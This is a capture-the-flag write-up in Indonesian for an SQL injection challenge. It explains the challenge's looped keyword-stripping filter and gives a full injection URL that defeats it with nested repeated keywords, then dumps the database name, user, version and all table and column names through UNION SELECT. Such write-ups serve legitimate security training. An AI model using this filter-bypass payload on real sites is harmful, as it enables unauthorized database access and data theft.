# Solution sqli1

Oke pertama , kita diberikan informasi sebagai berikut :
```
/**
 * 
 * Hey ,
 * Can u inject me ? ah ah aagh agh :v ,
 * But but, u must know about php, before inject me :)
 *
 *
 * Task ? 
 * - Print Image , Leet Name , Database , User, version , Time, and DIOS
 *
 *
 * clue ?
 * - need a key ? , u can brute me :v
 * - Hmm , kadang muncul kadang tidak . Beginilah hidup :(
 * - 30 adalah nomor keberuntungan ku :)
 * - I am very tired :(
 *
 * 
 * Solved ? pm me
 *
 * List solver ?
 * https://def-chall.000webhostapp.com/challenge1/solver.php
 * 
 */
 ```

 Beberapa point penting dari informasi diatas :
 - Untuk menyelesaikan challenge ini kita diharuskan untuk melakukan sql injection dengan disertai menampilkan Image , Leet Name , Database , User, version , Time, dan DIOS
 - Kemungkinan untuk mendapatkan key , kita diharuskan melakukan bruteforce
 - Angka 30 merupakan angka penting
 - Challenge ini melelahkan

Oke , Lanjut kita baca potongan kode yang tersedia berikut :
```

$id = $_GET['id'];

if(isset($_GET['key'])){
    $key = $_GET['key'];
    ...
        if(isset($_GET['num'])) {
            if((int)abs(log10(pow(23,13))*rand(1,2)) == (int)$_GET['num']){
                ...
                $data = $con->prepare($query);
                $data->execute();
                ?>
                ...

            <?php
            }else{
                echo "NONONO";
            }
        }else{
            echo "NONONO !1!1";
        }
    ...
    }else{
        echo "Wrong key , guys";
    }
}else{
    echo "where ur key ??,";
}
```

Dari sini kita tahu bahwa :
- Terdapat 3 parameter yaitu :
    - key
    - num
    - id
- Sql injection dapat dilakukan di ```$_GET['id']```
-  ```$_GET['num']``` nilainya acak
- Sementara untuk  ```$_GET['key']``` , kita diharuskan untuk melakukan bruteforce .


Disini saya sudah membuat potongan kode untuk : 
- [Brute force key](bruteforce_key.php)
- [Mengetahui random nilai yang tergenerate pada  ```$_GET['num']](```abs.php)

Oke , setelah itu kita lanjutkan pada proses sql injection .

```
...
for($i=0; $i<$looping;$i++){
    $id = preg_replace("/(union|and|img|src|img src|or|false|true|select|order|by|database|user|schema|-|'| |ASCII|BIN|BINARY OPERATOR|BIT_LENGTH|CAST|CHAR FUNCTION|CHARACTER_LENGTH|CHAR_LENGTH|CONCAT|CONCAT_WS|CONVERT|ELT|EXPORT_SET|EXTRACTVALUE|FIELD|FIND_IN_SET|where|HEX|INSERT FUNCTION|INSTR|LCASE|LEFT|LENGTH|LIKE|LOAD_FILE|LOCATE|LOWER|LPAD|LTRIM|MAKE_SET|MATCH AGAINST|MID|NOT LIKE|@|NOT REGEXP|OCT|OCTET_LENGTH|ORD|POSITION|QUOTE|REGEXP|REPEAT FUNCTION|REPLACE FUNCTION|REVERSE|RIGHT|RPAD|RTRIM|SOUNDEX|SOUNDS LIKE|SPACE|STRCMP|SUBSTR|SUBSTRING|SUBSTRING_INDEX|TRIM|UCASE|UNHEX|UPDATEXML|UPPER|ADDDATE|ADDTIME|CONVERT_TZ|CURDATE|CURRENT_DATE|CURRENT_TIME|CURRENT_TIMESTAMP|CURTIME|DATE FUNCTION|DATEDIFF|DATE_ADD|DATE_FORMAT|DATE_SUB|DAY|tables|DAYNAME|DAYOFMONTH|DAYOFWEEK|DAYOFYEAR|EXTRACT|FROM_DAYS|FROM_UNIXTIME|GET_FORMAT|HOUR|LAST_DAY|time|LOCALTIMESTAMP|MAKEDATE|MAKETIME|MICROSECOND|MINUTE|MONTH|MONTHNAME|NOW|PERIOD_ADD|tables|columns|column|table|PERIOD_DIFF|QUARTER|SECOND|SEC_TO_TIME|STR_TO_DATE|SUBDATE|SUBTIME|SYSDATE|TIME FUNCTION|TIMEDIFF|TIMESTAMP FUNCTION|TIMESTAMPADD|TIMESTAMPDIFF|TIME_FORMAT|TIME_TO_SEC|TO_DAYS|TO_SECONDS|UNIX_TIMESTAMP|UTC_DATE|UTC_TIME|UTC_TIMESTAMP|WEEK|WEEKDAY|WEEKOFYEAR|YEAR|YEARWEEK|BENCHMARK|CHARSET|COERCIBILITY|COLLATION|CONNECTION_ID|CURRENT_USER|DATABASE|FOUND_ROWS|LAST_INSERT_ID|ROW_COUNT|SCHEMA|SESSION_USER|USER|VERSION)/i", "", $id);
    }

    if(isset($_GET['id'])){
        $query = "select * from challenge1 where id=$id";
    }else{
        $query = "select * from challenge1";
    }
    $data = $con->prepare($query);
    $data->execute();
    ?>
    ...
```
Penjelasan kode : 
- Dilakukan looping sebanyak $looping kali ( yang saya tebak bernilai 30 , dikarenakan diawal disebutkan tentang angka 30 yang berkaitan dengan angka keberuntungan )
    - Didalam looping dilakukan preg_match terhadap``` $_GET ['id']``` bila mengandung kata yang berada dalam scope
- Jika``` $_GET ['id]'``` tidak di ada maka $query akan menampilkan semua data, apabila sebaliknya maka $query akan menampilkan data ber-id ,```  $_GET['id]'```

Disini saya telah membuat sebuah program untuk melakukan bypass terhadap fungsi yang ter-replace . Untuk sourcenya bisa dilihat [disini](exploit.py)

Dari beberapa program diatas , kalau kita gabungkan maka akan menghasilkan query berikut :
```
/?key=90770&num=17&id=1/**/ununiununiununiununiununiununiununiununiununiununiununiununiununiununiununiuniononiononiononiononiononiononiononiononiononiononiononiononiononiononiononion/**/selselselselselselselselselselselselselselselselselselselselselselselselselselselselselselselectectectectectectectectectectectectectectectectectectectectectectectectectectectectectectect/**/1,group_conconconconconconconconconconconconconconconconconconconconconconconconconconconconconconconcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcat(0x3C68313E47726579583C2F68313E3C696D67207372633D2268747470733A2F2F692E70696E696D672E636F6D2F6F726967696E616C732F37622F64312F66342F37626431663464386362393234343536363631323139313830343966646437612E6A7067223E),group_conconconconconconconconconconconconconconconconconconconconconconconconconconconconconconconcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcat(schschschschschschschschschschschschschschschschschschschschschschschschschschschschschschschemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaema(),"<br>",system_usususususususususususususususususususususususususususususususererererererererererererererererererererererererererererererer(),"<br>",verversverversverversverversverversverversverversverversverversverversverversverversverversverversverversversionionsionionsionionsionionsionionsionionsionionsionionsionionsionionsionionsionionsionionsionionsionionsion(),"<br>",localtititititititititititititititititititititititititititititititimememememememememememememememememememememememememememememememestamp),(selselselselselselselselselselselselselselselselselselselselselselselselselselselselselselselectectectectectectectectectectectectectectectectectectectectectectectectectectectectectectect/**/group_conconconconconconconconconconconconconconconconconconconconconconconconconconconconconconconcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcatcat(tatabtatabtatabtatabtatabtatabtatabtatabtatabtatabtatabtatabtatabtatabtatabtableleblelebleleblelebleleblelebleleblelebleleblelebleleblelebleleblelebleleble_name,"::",colcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumn_name)/**/from/**/infooooooooooooooooooooooooooooooorrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrmation_schschschschschschschschschschschschschschschschschschschschschschschschschschschschschschschemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaemaema.colcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolcolumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumnumns)
```

Terakhir kita injectkan script diatas ke [sini](https://def-chall.000webhostapp.com/challenge1/)
```
Catatan : Apabila script tidak keluar ,lakukan refresh untuk mendapatkan kode $_GET['num'] yang cocok .